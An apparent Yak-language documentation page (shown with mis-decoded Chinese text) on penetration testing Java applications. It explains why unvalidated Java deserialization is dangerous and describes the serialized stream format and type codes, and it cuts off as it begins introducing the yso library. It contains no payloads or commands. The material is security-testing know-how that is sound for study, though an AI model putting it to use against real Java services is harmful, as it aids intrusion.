<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.6">
<link rel="alternate" type="application/rss+xml" href="/en/blog/rss.xml" title="Yak Program Language Blog RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/en/blog/atom.xml" title="Yak Program Language Blog Atom Feed">
<link rel="search" type="application/opensearchdescription+xml" title="Yak Program Language" href="/en/opensearch.xml"><title data-react-helmet="true">æ¸—é€æµ‹è¯• Java åº”ç”¨ | Yak Program Language</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://yaklang.com/en/docs/yak-basic/cap8-5-java-hack"><meta data-react-helmet="true" name="docsearch:language" content="en"><meta data-react-helmet="true" name="docsearch:version" content="current"><meta data-react-helmet="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" property="og:title" content="æ¸—é€æµ‹è¯• Java åº”ç”¨ | Yak Program Language"><meta data-react-helmet="true" name="description" content="8.6.1  åŸºç¡€æ¦‚å¿µ: Javaååºåˆ—åŒ–"><meta data-react-helmet="true" property="og:description" content="8.6.1  åŸºç¡€æ¦‚å¿µ: Javaååºåˆ—åŒ–"><link data-react-helmet="true" rel="shortcut icon" href="/en/img/favicon.ico"><link data-react-helmet="true" rel="canonical" href="https://yaklang.com/en/docs/yak-basic/cap8-5-java-hack"><link data-react-helmet="true" rel="alternate" href="https://yaklang.com/docs/yak-basic/cap8-5-java-hack" hreflang="zh-CN"><link data-react-helmet="true" rel="alternate" href="https://yaklang.com/en/docs/yak-basic/cap8-5-java-hack" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://yaklang.com/docs/yak-basic/cap8-5-java-hack" hreflang="x-default"><link rel="stylesheet" href="/en/assets/css/styles.c38bde3d.css">
<link rel="preload" href="/en/assets/js/runtime~main.00e96540.js" as="script">
<link rel="preload" href="/en/assets/js/main.a328d75b.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/en/"><img src="/en/img/logo.png" alt="My Site Logo" class="themedImage_TMUO themedImage--light_4Vu1 navbar__logo"><img src="/en/img/logo.png" alt="My Site Logo" class="themedImage_TMUO themedImage--dark_uzRr navbar__logo"><b class="navbar__title"></b></a><a class="navbar__item navbar__link diy-link-item" href="/en/docs/intro">Yak è¯­è¨€æ–‡æ¡£</a><a class="navbar__item navbar__link diy-link-item" href="/en/api-manual/intro">API æ‰‹å†Œ</a><a class="navbar__item navbar__link diy-link-item" href="/en/products/intro">Yakit ä½¿ç”¨æ‰‹å†Œ</a><a class="navbar__item navbar__link diy-link-item" href="/en/articles/intro">æŠ€æœ¯åšå®¢</a><a class="navbar__item navbar__link diy-link-item" href="/en/irify">é™æ€ä»£ç åˆ†ææŠ€æœ¯</a><a class="navbar__item navbar__link diy-link-item" href="/en/Yaklab/yaklab">YakLab å®æˆ˜æ‰‹å†Œ</a><div class="navbar__item dropdown dropdown--hoverable"><a class="navbar__link diy-link-item">å…³äºæˆ‘ä»¬</a><ul class="dropdown__menu"><li><a activeclassname="dropdown__link--active" href="/en/team" to="/en/team" class="dropdown__link diy-link-item" target="_blank">å…³äºæˆ‘ä»¬</a></li><li><a activeclassname="dropdown__link--active" href="/en/cooperativePartner" to="/en/cooperativePartner" class="dropdown__link diy-link-item" target="_blank">åˆä½œä¼™ä¼´</a></li></ul></div></div><div class="navbar__items navbar__items--right"><a href="https://oss-qn.yaklang.com/yakit-technical-white-paper.pdf" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link diy-link-item"><span>ä¸‹è½½ç™½çš®ä¹¦</span></a><a href="https://github.com/yaklang" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link diy-link-item"><span>Github</span></a><div class="languageSwitcher"><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4163" width="20" height="20"><path d="M249.7536 378.5728c10.6496 31.6416 28.3648 59.0848 53.0432 83.2512 20.992-22.7328 36.7616-50.7904 47.0016-83.2512h-100.0448zM902.2464 191.488H511.2832L488.96 71.8848H125.952c-40.0384 0-72.6016 32.5632-72.6016 72.6016v617.1648c0 40.0384 32.5632 72.6016 72.6016 72.6016h330.9568l-26.5216 119.6032h471.9616c40.0384 0 72.6016-32.5632 72.6016-72.6016V264.192c-0.1024-40.1408-32.768-72.704-72.704-72.704zM409.3952 558.1824c-42.8032-15.7696-78.1312-35.84-106.5984-59.0848-29.7984 26.5216-67.072 46.08-110.2848 58.1632l-14.9504-24.6784c42.3936-11.1616 77.7216-27.9552 105.5744-51.712-28.7744-29.3888-48.8448-63.2832-60.1088-101.888h-40.448v-27.9552h105.5744c-6.5536-12.0832-14.9504-23.7568-24.6784-34.9184l27.9552-10.24c9.728 12.5952 18.6368 27.4432 26.5216 44.7488h100.9664v27.9552h-40.448c-13.0048 40.0384-31.6416 73.5232-56.32 100.5568 27.4432 21.9136 61.8496 40.0384 102.4 54.8864 0.1024 0.2048-15.1552 24.1664-15.1552 24.1664z m529.1008 322.56a36.352 36.352 0 0 1-36.352 36.352H475.9552l18.1248-83.2512h136.2944l-77.7216-433.2544-0.4096 2.3552-3.2768-17.3056 0.9216 0.4096-28.3648-158.3104h381.1328a36.352 36.352 0 0 1 36.352 36.352v616.6528h-0.512zM643.4816 538.2144h100.1472v-26.5216h-100.1472v-53.0432h106.5984V432.128H612.2496v190.7712h141.9264v-26.5216H643.4816v-58.1632z m208.9984-57.2416c-8.3968 0-15.7696 1.3312-22.7328 5.12-6.5536 3.2768-13.0048 8.3968-18.1248 14.9504v-16.2816H781.312v138.24h30.3104v-83.2512c0.9216-11.1616 4.7104-19.5584 11.1616-25.6 5.632-5.12 12.0832-7.9872 19.5584-7.9872 20.992 0 31.1296 11.1616 31.1296 33.9968v82.432h30.3104v-85.2992c0.8192-37.6832-16.896-56.32-51.3024-56.32z" p-id="4164"></path></svg></div><div class="searchBox_fBfG"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_lDyR"><button class="clean-btn backToTopButton_i9tI" type="button"><svg viewBox="0 0 24 24" width="28"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z" fill="currentColor"></path></svg></button><aside class="docSidebarContainer_0YBq"><div class="sidebar_a3j0"><nav class="menu thin-scrollbar menu_cyFh menuWithAnnouncementBar_+O1J"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" href="/en/docs/intro">Yakï¼šè‡´åŠ›äºå®‰å…¨èƒ½åŠ›èåˆçš„è¯­è¨€</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" href="/en/docs/startup">æ­å»º Yak è¯­è¨€å¼€å‘ç¯å¢ƒ</a></li><li class="theme-doc-sidebar-item-category menu__list-item"><a class="menu__link menu__link--sublist menu__link--active" href="#">åŸºç¡€è¯­æ³•æ–‡æ¡£</a><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap3-stats-vars-and-exprs">Yak è¯­è¨€ä¸­çš„è¯­å¥ã€å˜é‡å’Œè¡¨è¾¾å¼</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap4-control-flow">æ§åˆ¶æµï¼šIF For Switch</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap5-function">å‡½æ•°çš„åˆ›å»ºä¸ä½¿ç”¨</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap6-1-concurrent-and-defer">å¼‚æ­¥ã€å¹¶å‘ç¼–ç¨‹å’Œ defer å»¶è¿Ÿ</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap6-2-error-handling">Yak è¯­è¨€ä¸­çš„é”™è¯¯å¤„ç†</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap6-3-scope">ä½œç”¨åŸŸ</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap6-4-modules">æ¨¡å—åŒ–ä¸å¤šæ–‡ä»¶ç¼–ç¨‹</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap6-5-fuzztag">æ¨¡ç³Šæ–‡æœ¬æ¸²æŸ“: FuzzTag</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap7-buildin-functions">ä½¿ç”¨å†…ç½®å·¥å…·å‡½æ•°</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap8-1-http">HTTP åè®®ä¸æ•°æ®åŒ…å¤„ç†</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap8-2-mitm">ä¸­é—´äººæ”»å‡»: MITM</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap8-3-port-n-service-scan">ç½‘ç»œç«¯å£æ‰«æä¸æŒ‡çº¹è¯†åˆ«</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yak-basic/cap8-4-yaml-poc">ä½¿ç”¨ YAML ç¼–å†™ PoC</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/en/docs/yak-basic/cap8-5-java-hack">æ¸—é€æµ‹è¯• Java åº”ç”¨</a></li></ul></li><li class="theme-doc-sidebar-item-category menu__list-item"><a class="menu__link menu__link--sublist" href="#">ç¼–ç¨‹å®æˆ˜æ¡ˆä¾‹</a><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/intro">ç« èŠ‚ä»‹ç»</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/strutils">å‡½æ•°åº“ï¼šstr - å­—ç¬¦ä¸²å·¥å…·é›†</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/first_servicescan">ä½ çš„ç¬¬ä¸€ä¸ªæœåŠ¡æ‰«æç¨‹åº</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/codec">å‡½æ•°åº“ï¼šcodec - åŠ å¯†ä¸ç¼–ç </a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/first_synandscanfp">é«˜æ•ˆçš„ç«¯å£æ‰«æï¼šSYN+æŒ‡çº¹æ‰«æ</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/http-basic">å‡½æ•°åº“ï¼šhttp - åŸºæœ¬ HTTP é€šä¿¡</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/spacengine">ç½‘ç»œç©ºé—´å¼•æ“ä¿¡æ¯æ”¶é›†</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/http-advanced">å‡½æ•°åº“ï¼špoc - ä¸“å®¶ HTTP åº“</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/concurrent">YAK ä¸­ç¼–å†™&quot;å¤šçº¿ç¨‹/å¤šå¹¶å‘&quot;åº”ç”¨</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/yak_misc">å®æˆ˜1: æ‰«ç«¯å£/å­åŸŸå+æŒ‡çº¹è¯†åˆ«</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/fuzz-request">å‡½æ•°åº“ï¼šfuzz - æ¨¡ç³Šæµ‹è¯• HTTP</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/scan_and_crawler">å®æˆ˜2: æŒ‡çº¹æ‰«æ+åŸºç¡€çˆ¬è™«</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/fuzztag-basic">åŠŸèƒ½é›†ï¼šfuzztag - æ¨¡ç³Šæµ‹è¯•æ ‡ç­¾</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/regexp">å‡½æ•°åº“ï¼šre - æ­£åˆ™è¡¨è¾¾å¼</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/nuclei">YAK + Nucleiï¼šè¯­è¨€ä¸­çš„æ¼æ‰«</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/json">å‡½æ•°åº“ï¼šjson - ä¼˜é›…åœ°å¤„ç†JSON</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/fuzz_tutorial">Web Fuzz åŸºç¡€</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/synscan">å‡½æ•°åº“ï¼šsynscan - SYN æ‰«æ</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/fuzz_for_more">Web Fuzz é«˜çº§æ•™ç¨‹</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/fuzztag">Fuzz Tag Playbook</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/how_to_make_poc">å¦‚ä½•ç¼–å†™ä¼˜ç§€çš„ PoC/Exp ğŸ‘»</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/passive_scan">åˆæ¢è¢«åŠ¨æ‰«æ</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/func-p">ç¼–ç¨‹æŠ€å·§ï¼šå‡½æ•°å¼è¡¥å……è¯­æ³•</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/handle-scan-target">å¤„ç†æ‰«æç›®æ ‡ä¸ç½‘æ®µï¼ˆæ‰¹é‡/åˆ†ç»„ï¼‰</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/http-raw">å‘é€ HTTP åŸå§‹æ•°æ®åŒ…</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/hosts-to-cclass">å¤„ç†æ‰«æç›®æ ‡ï¼šCæ®µï¼ˆè‡ªåŠ¨ç”Ÿæˆï¼‰</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/batch-http">æ‰¹é‡å‘åŒ…: æ¨¡ç³Šæµ‹è¯•æ‰¹é‡å‘åŒ…</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/ysoserial-demo">Java ååºåˆ—åŒ–åˆ©ç”¨é“¾: yso(ysoserial)</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/similarity-calc">æ–‡æœ¬ç›¸ä¼¼åº¦ç®—æ³•ï¼šSQLMAPã€ SimHash ä¸ SSDeep</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/vs-dir-in-py">ç±»æ¯” Python ä¸­çš„ dir å‡½æ•°</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/xpath">HTML å¤„ç†ï¼šXPATH æ¡ˆä¾‹</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/risk">æ¼æ´æ£€æµ‹ï¼šDNSLog</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/en/docs/yakexamples/js-otto">æ‰§è¡Œ JavaScript ä»£ç  (otto styled)</a></li></ul></li></ul></nav></div></aside><main class="docMainContainer_r8cw"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_zHA2"><div class="docItemContainer_oiyr"><article><div class="tocCollapsible_aw-L theme-doc-toc-mobile tocMobile_Tx6Y"><button type="button" class="clean-btn tocCollapsibleButton_zr6a">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>æ¸—é€æµ‹è¯• Java åº”ç”¨</h1></header><header><h1>8.6 Java åºåˆ—åŒ–åè®®æ”¯æŒ</h1></header><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="861--åŸºç¡€æ¦‚å¿µ-javaååºåˆ—åŒ–"></a>8.6.1  åŸºç¡€æ¦‚å¿µ: Javaååºåˆ—åŒ–<a class="hash-link" href="#861--åŸºç¡€æ¦‚å¿µ-javaååºåˆ—åŒ–" title="Direct link to heading">#</a></h2><p>åœ¨Javaä¸­ï¼Œåºåˆ—åŒ–æ˜¯å°†å¯¹è±¡çŠ¶æ€è½¬æ¢ä¸ºå­—èŠ‚æµçš„è¿‡ç¨‹ï¼Œä»¥ä¾¿é€šè¿‡ç½‘ç»œä¼ è¾“æˆ–å­˜å‚¨åˆ°ç£ç›˜ã€‚ç›¸å¯¹åœ°ï¼Œååºåˆ—åŒ–åˆ™æ˜¯å°†è¿™äº›å­—èŠ‚æµè¿˜åŸå›åŸå§‹å¯¹è±¡çŠ¶æ€çš„è¿‡ç¨‹ã€‚Javaå…è®¸é€šè¿‡è‡ªå®šä¹‰<code>writeObject</code>å’Œ<code>readObject</code>æ–¹æ³•æ¥æ§åˆ¶åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç»†èŠ‚ã€‚ä¸è¿‡ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœè¾“å…¥æ•°æ®æœªç»è¿‡ä¸¥æ ¼éªŒè¯ï¼Œæ”»å‡»è€…ä¾¿æœ‰æœºä¼šæ³¨å…¥æ¶æ„æ•°æ®ã€‚è¿™äº›æ¶æ„æ•°æ®åœ¨<code>readObject</code>æ–¹æ³•å¤„ç†æ—¶ï¼Œå¯èƒ½ä¼šä¿®æ”¹å¯¹è±¡çŠ¶æ€æˆ–æ§åˆ¶æ‰§è¡Œæµç¨‹ï¼Œä»è€Œå¼•å…¥å®‰å…¨æ¼æ´ã€‚</p><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="862-åºåˆ—åŒ–å¯¹è±¡æµçš„ç»„æˆ"></a>8.6.2 åºåˆ—åŒ–å¯¹è±¡æµçš„ç»„æˆ<a class="hash-link" href="#862-åºåˆ—åŒ–å¯¹è±¡æµçš„ç»„æˆ" title="Direct link to heading">#</a></h2><p>Javaçš„åºåˆ—åŒ–æœºåˆ¶é‡‡ç”¨ä¸€ç§æ ‡å‡†æ ¼å¼ç¼–ç å¯¹è±¡ï¼ŒåŒ…æ‹¬<code>Magic Header</code>ã€ç‰ˆæœ¬ã€ç±»æè¿°å’Œç±»æˆå‘˜ç­‰ç»„ä»¶ï¼Œèƒ½å¤Ÿé€’å½’å¤„ç†æ•´ä¸ªå¯¹è±¡å›¾çš„è‡ªåŠ¨åºåˆ—åŒ–ã€‚</p><ul><li>Stream Magicï¼šç”±ä¸¤å­—èŠ‚åºåˆ—<code>AC ED</code>ç»„æˆï¼Œæ ‡è¯†åºåˆ—åŒ–å¯¹è±¡æµçš„å¼€å§‹ã€‚</li><li>Stream Versionï¼šç´§éšå…¶åçš„ä¸¤ä¸ªå­—èŠ‚ï¼ˆé€šå¸¸ä¸º<code>00 05</code>ï¼‰ï¼Œæ ‡æ˜åºåˆ—åŒ–æµçš„ç‰ˆæœ¬ã€‚</li><li>Object Graphï¼šä»<code>TC_OBJECT</code>æ ‡è®°å¼€å§‹ï¼Œæ ‡è¯†æ¥ä¸‹æ¥çš„æ•°æ®ä»£è¡¨ä¸€ä¸ªå¯¹è±¡ï¼Œæ¥ç€æ˜¯ç±»æè¿°å™¨ï¼Œé€’å½’åºåˆ—åŒ–å¯¹è±¡å’Œç±»çš„ç»“æ„ï¼š<ul><li>Class Descriptorï¼šæ¯ä¸ªå¯¹è±¡æˆ–ç±»çš„æè¿°ä¿¡æ¯ï¼Œä»¥<code>TC_CLASSDESC</code>å¼€å¤´ï¼Œåè·Ÿç±»åã€<code>SerialVersionUID</code>ï¼ˆç±»ç‰ˆæœ¬éªŒè¯ï¼‰ç­‰ä¿¡æ¯ã€‚</li><li>Class Dataï¼šå¯¹è±¡ä¸­æ¯ä¸ªå­—æ®µçš„å€¼ï¼ŒæŒ‰ç…§ç±»æè¿°ä¸­çš„é¡ºåºæ’åˆ—ã€‚</li></ul></li><li>Block Dataï¼šé’ˆå¯¹<code>Externalizable</code>å¯¹è±¡ï¼ŒåŒ…å«<code>writeObject</code>/<code>readObject</code>æ–¹æ³•å†™å…¥çš„è‡ªå®šä¹‰æ•°æ®ã€‚</li><li>Type Codesï¼šç±»å‹ä»£ç ï¼Œå¦‚<code>TC_NULL</code>ï¼ˆç©ºå¼•ç”¨ï¼‰ã€<code>TC_STRING</code>ï¼ˆå­—ç¬¦ä¸²å¯¹è±¡ï¼‰ã€<code>TC_ARRAY</code>ï¼ˆæ•°ç»„å¯¹è±¡ï¼‰ç­‰ï¼Œæ ‡è¯†ä¸åŒç±»å‹çš„æ•°æ®æˆ–å¯¹è±¡çŠ¶æ€ã€‚</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="ç±»æè¿°class-descriptor"></a>ç±»æè¿°ï¼šClass Descriptor<a class="hash-link" href="#ç±»æè¿°class-descriptor" title="Direct link to heading">#</a></h3><ul><li><strong>TC_CLASSDESC</strong>: ç±»æè¿°æ ‡è®°ã€‚</li><li><strong>ClassName</strong>: ç±»åå­—ç¬¦ä¸²ã€‚</li><li><strong>SerialVersionUID</strong>: ç±»çš„ serialVersionUIDï¼Œç”¨äºéªŒè¯ç±»ç‰ˆæœ¬ã€‚</li><li><strong>Class Flags</strong>: ç±»çš„æ ‡å¿—ï¼Œå¦‚æ˜¯å¦æ”¯æŒ <code>Serializable</code>ã€<code>Externalizable</code> ç­‰ã€‚</li><li><strong>Field Count</strong>: ç±»ä¸­å­—æ®µçš„æ•°é‡ã€‚</li><li><strong>Fields</strong>: ç±»å­—æ®µçš„æè¿°ã€‚<ul><li><strong>FieldName</strong>: å­—æ®µåã€‚</li><li><strong>FieldType</strong>: å­—æ®µç±»å‹ã€‚</li></ul></li><li><strong>Class Annotation</strong>: ç±»æ³¨è§£ï¼Œç”¨äºæ”¯æŒä»£ç†ç±»å’Œå…¶ä»–ç‰¹æ€§ã€‚</li><li><strong>Super Class</strong> <strong>Descriptor</strong>: çˆ¶ç±»æè¿°ç¬¦ï¼Œé€’å½’åœ°åºåˆ—åŒ–çˆ¶ç±»ã€‚</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="ç±»å‹ç type-codes"></a>ç±»å‹ç ï¼š<strong>Type Codes</strong><a class="hash-link" href="#ç±»å‹ç type-codes" title="Direct link to heading">#</a></h3><p>ä¸‹è¡¨æ˜¯æŒ‰ç…§ç±»å‹ç çš„åŠŸèƒ½å’Œå¯¹åº”çš„å­—èŠ‚å€¼æ•´ç†çš„ä¿¡æ¯ï¼š</p><table><thead><tr><th>Type Code</th><th>Byte Value (Hex)</th><th>Description</th></tr></thead><tbody><tr><td>TC_OBJECT</td><td>0x73 (&#x27;s&#x27;)</td><td>è¡¨ç¤ºä¸€ä¸ªå¯¹è±¡</td></tr><tr><td>TC_CLASS</td><td>0x76 (&#x27;v&#x27;)</td><td>è¡¨ç¤ºä¸€ä¸ªç±»å¯¹è±¡</td></tr><tr><td>TC_ARRAY</td><td>0x75 (&#x27;u&#x27;)</td><td>è¡¨ç¤ºä¸€ä¸ªæ•°ç»„å¯¹è±¡</td></tr><tr><td>TC_STRING</td><td>0x74 (&#x27;t&#x27;)</td><td>è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td></tr><tr><td>TC_LONGSTRING</td><td>0x7c (&#x27;</td><td>&#x27;)</td></tr><tr><td>TC_ENUM</td><td>0x7e (&#x27;~&#x27;)</td><td>è¡¨ç¤ºä¸€ä¸ªæšä¸¾ç±»å‹</td></tr><tr><td>TC_CLASSDESC</td><td>0x72 (&#x27;r&#x27;)</td><td>ç±»æè¿°æ ‡è®°</td></tr><tr><td>TC_PROXYCLASSDESC</td><td>0x7d (&#x27;}&#x27;)</td><td>ä»£ç†ç±»æè¿°æ ‡è®°</td></tr><tr><td>TC_EXCEPTION</td><td>0x7b (&#x27;{&#x27;)</td><td>åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­å‘ç”Ÿçš„å¼‚å¸¸</td></tr><tr><td>TC_RESET</td><td>0x79 (&#x27;y&#x27;)</td><td>é‡ç½®åºåˆ—åŒ–æµçš„å›æº¯çŠ¶æ€</td></tr><tr><td>TC_REFERENCE</td><td>0x71 (&#x27;q&#x27;)</td><td>è¡¨ç¤ºå¯¹å…ˆå‰å·²åºåˆ—åŒ–å¯¹è±¡çš„å¼•ç”¨</td></tr><tr><td>TC_NULL</td><td>0x70 (&#x27;p&#x27;)</td><td>è¡¨ç¤ºä¸€ä¸ªç©ºå¼•ç”¨</td></tr><tr><td>TC_BLOCKDATA</td><td>0x77 (&#x27;w&#x27;)</td><td>è¡¨ç¤ºå¯¹è±¡çš„éé€æ˜å—æ•°æ®å†…å®¹</td></tr><tr><td>TC_BLOCKDATALONG</td><td>0x7a (&#x27;z&#x27;)</td><td>è¡¨ç¤ºé•¿å—æ•°æ®</td></tr><tr><td>TC_ENDBLOCKDATA</td><td>0x78 (&#x27;x&#x27;)</td><td>ç»“æŸå—æ•°æ®çš„æ ‡è®°</td></tr><tr><td>TC_UNKNOWN</td><td>0x00</td><td>æœªçŸ¥ç±»å‹ç </td></tr></tbody></table><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="863-yak-è¯­è¨€ä¸­å¯¹åºåˆ—åŒ–æ•°æ®æµçš„æ“ä½œ"></a>8.6.3 Yak è¯­è¨€ä¸­å¯¹åºåˆ—åŒ–æ•°æ®æµçš„æ“ä½œ<a class="hash-link" href="#863-yak-è¯­è¨€ä¸­å¯¹åºåˆ—åŒ–æ•°æ®æµçš„æ“ä½œ" title="Direct link to heading">#</a></h2><p>åœ¨Yakä¸­ï¼Œ<code>yso</code>åº“è¢«è®¾è®¡ç”¨æ¥å¤„ç†Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ä»»åŠ¡ã€‚å…·ä½“æ¥è¯´ï¼Œå¯ä»¥åˆ†ä¸ºå‡ ç±»å‡½æ•°ï¼Œå¦‚è§£æã€ç”Ÿæˆã€è¾“å‡ºã€‚</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="è§£æåºåˆ—åŒ–å¯¹è±¡"></a>è§£æåºåˆ—åŒ–å¯¹è±¡<a class="hash-link" href="#è§£æåºåˆ—åŒ–å¯¹è±¡" title="Direct link to 